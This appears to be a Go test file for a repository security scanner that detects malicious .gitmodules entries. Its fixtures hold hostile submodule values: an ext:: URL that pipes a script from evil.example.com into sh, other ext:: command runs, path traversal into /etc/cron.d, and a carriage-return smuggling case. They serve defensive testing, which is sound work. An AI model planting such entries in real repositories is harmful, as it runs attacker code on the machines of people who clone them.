package scanner_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func submoduleScan(t *testing.T, repo string) []scanner.Finding {
	t.Helper()
	m := scanner.NewSubmodulesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("submodules scan error: %v", err)
	}
	return findings
}

func TestSubmodulesScanner_NoGitmodules(t *testing.T) {
	repo := makeRepo(t)
	findings := submoduleScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings, got %d", len(findings))
	}
}

func TestSubmodulesScanner_CleanGitmodules(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitmodules"), `[submodule "vendor/lib"]
	path = vendor/lib
	url = https://github.com/legit/lib.git
`)
	findings := submoduleScan(t, repo)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean .gitmodules, got %d: %v", len(findings), findings)
	}
}

func TestSubmodulesScanner_ExtProtocol_IsCritical(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitmodules"), `[submodule "evil"]
	path = vendor/evil
	url = ext::sh -c "curl http://evil.example.com/attack.sh|sh"
`)
	findings := submoduleScan(t, repo)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding for ext:: URL, got %d: %v", len(findings), findings)
	}
	f := findings[0]
	if f.Severity != scanner.Critical {
		t.Errorf("severity = %v, want CRITICAL", f.Severity)
	}
	if f.Module != "submodules" {
		t.Errorf("module = %q, want %q", f.Module, "submodules")
	}
	if !strings.Contains(f.Message, "ext::") {
		t.Errorf("message %q should contain 'ext::'", f.Message)
	}
}

func TestSubmodulesScanner_PathTraversal_IsCritical(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitmodules"), `[submodule "escape"]
	path = ../../../etc/cron.d/attack
	url = https://github.com/attacker/payload.git
`)
	findings := submoduleScan(t, repo)
	if len(findings) < 1 {
		t.Fatalf("expected at least 1 finding for path traversal, got 0")
	}
	var found bool
	for _, f := range findings {
		if strings.Contains(f.Message, "traversal") || strings.Contains(f.Message, "../") {
			found = true
			if f.Severity != scanner.Critical {
				t.Errorf("traversal finding severity = %v, want CRITICAL", f.Severity)
			}
		}
	}
	if !found {
		t.Errorf("no traversal finding in: %v", findings)
	}
}

func TestSubmodulesScanner_CarriageReturnInPath_IsCritical(t *testing.T) {
	// CVE-2025-48384: CR in submodule path causes git to write to a different
	// path than displayed. We embed a literal CR (\r) in the path value.
	repo := makeRepo(t)
	content := "[submodule \"cr\"]\n\tpath = vendor/lib\r\n\turl = https://github.com/legit/lib.git\n"
	writeFile(t, filepath.Join(repo, ".gitmodules"), content)
	findings := submoduleScan(t, repo)
	if len(findings) < 1 {
		t.Fatalf("expected at least 1 finding for CR in path (CVE-2025-48384), got 0")
	}
	var found bool
	for _, f := range findings {
		msg := strings.ToLower(f.Message)
		if strings.Contains(msg, "carriage") || strings.Contains(msg, `\r`) ||
			strings.Contains(msg, "cr") {
			found = true
			if f.Severity != scanner.Critical {
				t.Errorf("CR finding severity = %v, want CRITICAL", f.Severity)
			}
		}
	}
	if !found {
		t.Errorf("no CR-smuggling finding in: %v", findings)
	}
}

func TestSubmodulesScanner_MultipleAttacks_AllReported(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitmodules"), `[submodule "ext-attack"]
	path = vendor/ext
	url = ext::sh -c "id > /tmp/pwned"
[submodule "traversal-attack"]
	path = ../outside-repo
	url = https://github.com/attacker/payload.git
[submodule "legit"]
	path = vendor/legit
	url = https://github.com/legit/project.git
`)
	findings := submoduleScan(t, repo)
	if len(findings) < 2 {
		t.Errorf("expected at least 2 findings, got %d: %v", len(findings), findings)
	}
}

func TestSubmodulesScanner_ExtProtocol_VariousFormats(t *testing.T) {
	urls := []struct {
		name string
		url  string
	}{
		{"ext double colon plain", "ext::git-remote-ext"},
		{"ext with space command", "ext::sh -c 'attack'"},
		{"ext with long command", "ext::python3 -c 'import socket; s=socket.socket()'"},
	}
	for _, tt := range urls {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			repo := makeRepo(t)
			content := fmt.Sprintf(
				"[submodule \"test\"]\n\tpath = vendor/test\n\turl = %s\n", tt.url)
			writeFile(t, filepath.Join(repo, ".gitmodules"), content)
			findings := submoduleScan(t, repo)
			if len(findings) == 0 {
				t.Errorf("expected finding for ext:: URL %q, got 0", tt.url)
			}
		})
	}
}

func TestSubmodulesScanner_PathWithDotDotMidPath(t *testing.T) {
	repo := makeRepo(t)
	writeFile(t, filepath.Join(repo, ".gitmodules"), `[submodule "mid-traversal"]
	path = vendor/../../../attack
	url = https://github.com/attacker/payload.git
`)
	findings := submoduleScan(t, repo)
	if len(findings) == 0 {
		t.Error("expected finding for mid-path traversal (vendor/../../../attack)")
	}
}

func TestSubmodulesScanner_GitmodulesIsDirectory_NoError(t *testing.T) {
	repo := makeRepo(t)
	// .gitmodules as a directory must not panic or error.
	if err := os.MkdirAll(filepath.Join(repo, ".gitmodules"), 0o755); err != nil {
		t.Fatalf("setup: %v", err)
	}
	m := scanner.NewSubmodulesModule()
	_, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: repo})
	if err != nil {
		t.Fatalf("scanner must not error when .gitmodules is a directory: %v", err)
	}
}

func TestSubmodulesScanner_ModuleName(t *testing.T) {
	m := scanner.NewSubmodulesModule()
	if m.Name() != "submodules" {
		t.Errorf("Name() = %q, want %q", m.Name(), "submodules")
	}
}
